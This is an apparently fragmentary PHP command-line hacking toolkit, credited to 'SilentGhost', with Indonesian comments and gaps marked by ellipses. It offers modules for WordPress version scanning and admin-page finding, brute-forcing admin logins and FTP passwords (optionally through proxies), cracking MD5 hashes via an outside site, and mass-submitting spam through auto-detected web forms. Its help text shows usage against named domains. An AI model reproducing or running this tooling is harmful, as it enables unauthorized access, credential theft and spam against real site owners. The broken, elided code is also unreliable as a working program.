...
'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php');
 ...
 function get($url){
	...
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Ubuntu; Linux i686; 
...
$installpage=get($wpsite."wp-admin/install.php");
					if(strstr($readmepage[0],"Version")){
						$versi= 
explode("Version",$readmepage[0]);
						$versi=explode("</h1>",$versi[1]);
						$versi=$versi[0];
						return $versi;
					}else{
						if(strstr($wpsite,'<meta 
name="generator"')){
							$versi=explode('<meta 
name="generator" content="',$wpsite);
...
if(strstr($installpage[0],"<link rel='stylesheet' id='install-css'  href=")){
								$versi= 
explode("<link rel='stylesheet' id='install-css'  href='",$installpage[0]);
...
\r\n\r\n";
					...
					echo "\033[01;33m cek file  'wordpress 
logs.txt' untuk lihat hasilnya ! \n\n \033[0m";
				fclose($bukalog);
			}
			break;
...
$cekpr=getproxy("http://google.com",$list_proxy[$d],$proxy_tipe[$d]);
				...
				if($test<=0){echo "\033[01;32m Proxy ini mati om 
!! \033[0m \n";
				if(count($list_proxy)>1)
				{
				$d=$d+1;
...
$cekpr=getproxy("http://google.com",$list_proxy[$d],$proxy_tipe[$d]);
					$test = stripos($cekpr[0],'<form');		
					if($test<=0){echo "\033[01;32m Proxy ini 
mati om !! \033[0m \n";exit;}
				}
				else{exit;} }				
...
$plokasi=str_replace(array("</ip>","<gml:name>","</gml:name>","<countryName>","</countryName>","<countryAbbrev>")," 
",$plokasi);
					echo $plokasi."\n\n";				
					for($i= $huruf_awal; $i < $huruf_akhir; 
$i++) cek_page2($url.$i,$list_proxy[$d],$proxy_tipe[$d]);
...
!! \033[0m \n"; exit; }					
					$lokasi= 
getproxy("http://api.hostip.info/?ip=",$list_proxy,$proxy_tipe);
					$plokasi=explode("<Hostip>",$lokasi[0]);
...
",$plokasi);
					echo $plokasi."\n\n";					
				for($i= $huruf_awal; $i < $huruf_akhir; $i++) 
cek_page2($url.$i,$list_proxy,$proxy_tipe);			
			}
		}else{
...
if(@ftp_login(@ftp_connect($domain),$user,$key)){
						echo " \033[01;31m Found -> 
Password ".$key." \033[0m /n";
...
$domen=str_replace(array("http://","http://www",":","/"),"",$argv[2]);
			for($i= $huruf_awal; $i < $huruf_akhir; 
$i++)login($domen,$argv[3],$i);
			}else{
				echo "\nMasukkan Min dan Max huruf, ex : 1-3 \n";	
				echo "\n ftp-brute [domain] [user] \n Example : 
ftp-brute explorecrew.org iamvba 1-5 \n\n";				
			}
			break;
		case 'crackmd5':
...
$crack=get('http://explorecrew.org/tools/md5.php?hash='.$argv[2]);
		...
		if(isset($argv[2])){
			if(isset($argv[3]))
			{
			if(!is_numeric($argv[3])){echo "Anda Memasukkan JUmlah 
yang salah untuk SPAM!";exit; }
				for($i=1;$i<=$argv[3];$i++)
				{
						$url=$argv[2];
...
$input)
							{
								$matchs = array();
								preg_match("/put 
type=\"(\\w+?)\" name=\"(\\w+?)\" /" , $input, $matchs);
								
if(trim($matchs[2])!=""){$hasil.=trim($matchs[2])."=VbA@ExploreCrew.org&";};
							}	
							
$cektextbox=explode("<tex",$data);
							foreach($cektextbox as 
$textbox)
							{
								$matchs = array();
								preg_match("/tarea 
name=\"(\\w+?)\"/" , $textbox, $matchs);
								
if(trim($matchs[1])!=""){$hasil.=trim($matchs[1])."=Mini Tool Auto Spammer Coded 
by VbA&";};
							}
							
$cekselect=explode("<sel",$data);
							foreach($cekselect as 
$select)
							{
								$matchs = array();
								preg_match("/ect 
name=\"(\\w+?)\"/" , $select, $matchs);
...
$spam=sendpost($target,$hasil);
								...
								{
									echo 
"\033[01;31m $i $target =>  Berhasil di SPAM \033[0m";
									echo "\n";
								}else{
									echo "$i 
$target => Gagal di spam \n";
								}
				}
			}else{
		...
		case 'help':
				echo "
              I   N   D   R   A   M   A   Y   U     C   O   D   E   R    T   E   A   
M
              _________.__.__                 __     ________.__                    
__   
             /   _____/|__|  |   ____   _____/  |_  /  _____/|  |__   ____  
_______/  |_ 
             \_____  \ |  |  | _/ __ \ /    \   __\/   \  ___|  |  \ /  _ \/  
___/\   __\
             /        \|  |  |_\  ___/|   |  \  |  \    \_\  \   Y  (  <_> )___ \  
|  |  
            /_______  /|__|____/\___  >___|  /__|   \______  /___|  /\____/____  > 
|__|  
                    \/              \/ [ WordPres Tools Scanner ] \/           \/        

   \033[01;32m Author - SilentGhost  \n
   Special Thanks to : Indramayu Coder Team  \n 
...
Command  : \n";
								echo "	
\033[01;34m wp-scan [url] \033[0m\n\033[01;33m	ex: wp-scan SilentGhost.com\n		
Scanning Vuln Worpdress, Tambah Vuln wp di script untuk lebih relevant\n\033[0m";
								echo "	
\033[01;34m admin-finder [url] \033[0m\n\033[01;33m	ex: admin-finder 
SilentGhost.com\n		Pencari Halaman login website dengan direktori 
list admin page di script\n\033[0m";
								echo "	
\033[01;34m af-brute [url] [min-max character] \033[0m\n\033[01;33m	ex: 
af-brute SilentGhost.com 1-6\n		Brute Force Halaman Login Admin dimulai 
dari a-z dengan minimum-maximum huruf \n	ex w/ proxy: af-brute 
SilentGhost.com 1-6 ip:port:tipe,ip:port:tipe,210.22.135.125:3128:https\n		
Brute Force halaman login admin dimulai dari a-z dengan min-max huruf ditambah 
PROXY\n\033[0m";
								echo "	
\033[01;34m ftp-brute [domain] [user] \033[0m\n	\033[01;33mex: ftp-brute 
SilentGhost.com iamvba\n		Brute Fore FTP dimulai dari a-z dengan 
min-max huruf\n\033[0m";
								echo "	
\033[01;34m crackmd5  [md5] \033[0m\n\033[01;33m	ex: crackmd5 
0e47aed10bb21162cc9df9ec78a4f7d1\n		crack hash md5 jadi karakter 
semula\n\033[0m";										
								echo "	
\033[01;34m formspammer  [url target] [jumlah spam] \033[0m\n\033[01;33m	
ex: formspammer http://SilentGhost.com/Contact\n		Form Spammer untuk 
nyepam sebuah form target, cukup masukkan URL dimana form itu berada maka otomatis 
di detect untuk spam\n\033[0m";										
								echo  "	
\033[01;34m help => return this :P \033[0m\n";
							echo "\033[0m";
			break;		
}
}else{
...
|__|  
   ...
   \033[0m  \n\n";
					...
					echo "\033[01;33m ";
						...
						echo "	\033[01;34m wp-scan [url] 
\033[0m\n\033[01;33m	ex: wp-scan SilentGhost.com\n		Scanning Vuln 
Worpdress, Tambah Vuln wp di script untuk lebih relevant\n\033[0m";
						echo "	\033[01;34m admin-finder 
[url] \033[0m\n\033[01;33m	ex: admin-finder SilentGhost.com\n		
Pencari Halaman login website dengan direktori list admin page di 
script\n\033[0m";
						echo "	\033[01;34m af-brute [url] 
[min-max character] \033[0m\n\033[01;33m	ex: af-brute SilentGhost.com 1-6\n		
Brute Force Halaman Login Admin dimulai dari a-z dengan minimum-maximum huruf \n	
ex w/ proxy: af-brute SilentGhost.com 1-6 
ip:port:tipe,ip:port:tipe,210.22.135.125:3128:https\n		Brute Force 
halaman login admin dimulai dari a-z dengan min-max huruf ditambah 
PROXY\n\033[0m";
						echo "	\033[01;34m ftp-brute 
[domain] [user] \033[0m\n	\033[01;33mex: ftp-brute SilentGhost.com iamvba\n		
Brute Fore FTP dimulai dari a-z dengan min-max huruf\n\033[0m";
						echo "	\033[01;34m crackmd5  
[md5] \033[0m\n\033[01;33m	ex: crackmd5 0e47aed10bb21162cc9df9ec78a4f7d1\n		
crack hash md5 jadi karakter semula\n\033[0m";										
						echo "	\033[01;34m formspammer  
[url target] [jumlah spam] \033[0m\n\033[01;33m	ex: formspammer 
http://SilentGhost.com/Contact\n		Form Spammer untuk nyepam sebuah 
form target, cukup masukkan URL dimana form itu berada maka otomatis di detect 
untuk spam\n\033[0m";										
						echo  "	\033[01;34m help => return 
this :P \033[0m\n";
					echo "\033[0m";
}
